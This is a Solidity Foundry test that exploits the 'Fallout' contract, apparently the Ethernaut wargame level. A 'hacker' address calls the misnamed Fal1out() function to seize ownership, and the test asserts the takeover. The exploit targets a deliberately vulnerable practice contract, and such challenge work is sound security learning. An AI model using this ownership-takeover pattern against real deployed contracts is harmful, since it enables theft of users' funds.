// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Test} from "forge-std/Test.sol";
import {Fallout} from "../src/fallout.sol";
import {deployScript} from "../script/deploy.s.sol";

contract fallyTesting is Test{
Fallout falyout;

    function setUp() public{
deployScript fallyScript = new deployScript();
falyout = fallyScript.run();
    }
function testFallouty() public{
    for(uint256 i = 1 ; i<4;i++){
        address player = address(uint160(i));
        vm.deal(player , 10 ether);
        vm.prank(player);
        falyout.allocate{value:5 ether}();
    }
    address hacker = makeAddr("Saad");
    vm.deal(hacker,10 ether);
    vm.prank(hacker);
 falyout.Fal1out{value:5 ether}();

falyout. collectAllocations();

assertEq(address(hacker),falyout.owner());

}

}